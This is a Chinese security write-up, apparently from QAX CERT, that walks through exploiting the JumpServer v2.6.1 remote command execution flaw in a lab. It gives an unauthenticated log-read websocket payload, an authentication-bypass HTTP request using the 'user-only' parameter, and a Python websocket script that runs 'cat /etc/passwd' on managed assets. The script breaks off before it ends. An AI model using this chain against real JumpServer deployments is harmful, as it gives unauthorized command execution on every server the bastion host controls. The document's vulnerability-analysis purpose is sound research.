**作者：Veraxy@QAX CERT  
原文链接：**
作为国内开源堡垒机的中流砥柱，前段时间JumpServer爆出了远程命令执行漏洞，掀起了不小的热度，很多小伙伴看过网上的分析文章之后仍旧一知半解，本文带大家一起做深入分析，研究各个点之间的关联和原理，同时补充相关知识点，帮助大家理清楚这个洞，从而可以思考如何利用，文末附漏洞利用工具。如有不足之处，欢迎批评指正。
# 0x01产品了解
Jumpserver 是一款由python编写开源的跳板机(堡垒机)系统，实现了跳板机应有的功能，基于ssh协议来管理，客户端无需安装agent。
主要包含四个项目组件，分别是Lina、Luna、Koko、Guacamole。其中Koko 是Go版本的coco，提供了 SSH、SFTP、web
terminal、web文件管理功能。
## Jumpserver部署
下载安装包
    # git clone https://github.com/jumpserver/installer.git
    # cd installer?
国内docker源加速安装
    # export DOCKER_IMAGE_PREFIX=docker.mirrors.ustc.edu.cn
    # ./jmsctl.sh install
升级到指定版本
    # ./jmsctl.sh upgrade v2.6.1
启动服务
    #?./jmsctl.sh start
    #?./jmsctl.sh restart
## 环境配置
Jumpserver v2.6.1版本，访问服务正常，默认管理员账户admin/admin，初次登录须改密码。
1.添加管理用户。
资产管理里面的"管理用户"是jumpserver用来管理资产需要的服务账户，Jumpserver使用该用户来 '推送系统用户'、'获取资产硬件信息'等。
2.“资产列表”中添加资产
测试资产可连接性，保证资产存活
3.创建系统用户
系统用户是 Jumpserver 跳转登录资产时使用的用户，可以理解为登录资产的用户。
配置“登录方式”为自动登录
4.创建资产授权
5.使用“Web终端”连接资产
为保证漏洞复现顺利进行，需要在Web终端中连接某资产。
Web终端以root用户名登录机器。
若配置的登录模式为“手动登录”，所以需要输入密码进行连接。
"自动登录"则可调用系统预留密码直接连接。
# 0x02漏洞利用
## 日志文件读取
系统中/ws/ops/tasks/log/接口无身份校验，可直接与其建立websocket连接，当为“task”参数赋值为具体文件路径时，可获取其文件内容。系统接收文件名后会自动添加.log后缀，所以只能读取.log类型的日志文件。
默认/opt/jumpserver/logs/ 下存放日志文件，包含jumpserver.log、gunicorn.log、dapgne.log等。
gunicorn是常用的WSGI容器之一，用来处理Web框架和Web服务器之间的通信，gunicorn.log是API调用历史记录比较全的日志文件。
利用/ws/ops/tasks/log/接口查看/opt/jumpserver/logs/gunicorn.log文件内容，由于系统会自动添加.log后缀，故无须添加文件后缀，目标路径为
"/opt/jumpserver/logs/gunicorn" 即可。
    ws://192.168.18.182:8080/ws/ops/tasks/log/
    {"task":"/opt/jumpserver/logs/gunicorn"}
在日志中寻找有用数据，其中/api/v1/perms/asset-permissions/user/validate接口的请求记录值得注意，这个API是用来验证用户的资产控制权限的。由于web终端连接资产时会对用户所属资产权限进行校验，调用了这个接口，故会留下日志记录。其中asset_id、system_user_id、user_id参数值可以被利用。
    asset_id=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f
    system_user_id=a893cb8f-26f7-41a8-a983-1de24e7c3d73
    user_id=f26371c9-18c3-4c4e-979f-95d34ffdb911
## 认证绕过+获取token
/api/v1/authentication/connection-token/接口和/api/v1/users/connection-token/接口均可通过 **user-only** 参数绕过权限认证。
两接口对数据的处理逻辑一致，其中post请求处理函数要求data数据中携带"user"、"asset"、"system_user"参数，同时系统自动生成一个20s有效期的token，收到合法请求会将这个token返回。
上文从日志中获取到的三个参数值可以用在这里，分别赋值给post请求要求的data中的"user"、"asset"、"system_user"参数，同时在URL中添加
**user-only** 参数来绕过认证，最终获得一个20s有效期的token。
    POST /api/v1/authentication/connection-token/?user-only=Veraxy HTTP/1.1
    Host: 192.168.18.182:8080
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:84.0) Gecko/20100101 Firefox/84.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept-Encoding: gzip, deflate
    Connection: close
    Cookie: csrftoken=GsRQYej2Fr3uk3xU9OPfZREl8Wn7xCXPqLSWQGIILIk7uz7izdqojUgYQ5UhG04j; jms_current_role=146; jms_current_org=%7B%22id%22%3A%22DEFAULT%22%2C%22name%22%3A%22DEFAULT%22%7D
    Upgrade-Insecure-Requests: 1
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 133
    user=f26371c9-18c3-4c4e-979f-95d34ffdb911&asset=fac9cfc0-b8f1-4aa5-9893-b8f5cdc8de0f&system_user=a893cb8f-26f7-41a8-a983-1de24e7c3d73
上图请求接口替换成/api/v1/users/connection-token/达到的目的一样
## 远程命令执行
系统/koko/ws/token/接口要求"target_id"参数，携带合法"target_id"参数即可利用该接口建立TTY通信。
上文通过/api/v1/authentication/connection-token/接口获得的20s有效期的token可作为/koko/ws/token/接口的有效"target_id"参数值，从而建立websocket会话。
    ws://192.168.18.182:8080/koko/ws/token/?target_id=0a14ec3d-312f-44e0-8224-da1a4151f32e
借助脚本进行websocket通信
    import asyncio
    import websockets
    import requests
    import json
    url = "/api/v1/authentication/connection-token/?user-only=None"
    # 向服务器端发送认证后的消息
    async def send_msg(websocket,_text):
        if _text == "exit":
            print(f'you have enter "exit", goodbye')
            await websocket.close(reason="user exit")
            return False
        await websocket.send(_text)
        recv_text = await websocket.recv()
        print(f"{recv_text}")
    # 客户端主逻辑
    async def main_logic(cmd):
        print("###start ws")
        async with websockets.connect(target) as websocket:
            recv_text = await websocket.recv()
            print(f"{recv_text}")
            resws=json.loads(recv_text)
            id = resws['id']
            print("get ws id:"+id)
            print("#######1########")
            print("init ws")
            print("#######2########")
            inittext = json.dumps({"id": id, "type": "TERMINAL_INIT", "data": "{\"cols\":234,\"rows\":13 }"})
            await send_msg(websocket,inittext)
            print("########3#######")
            print("exec cmd: ls")
            cmdtext = json.dumps({"id": id, "type": "TERMINAL_DATA", "data": cmd+"\r\n"})
            print(cmdtext)
            await send_msg(websocket, cmdtext)
            for i in range(20):
                recv_text = await websocket.recv()
                print(f"{recv_text}")
            print('###finish')
    if __name__ == '__main__':
        host = "http://192.168.18.182:8080"
        cmd="cat /etc/passwd"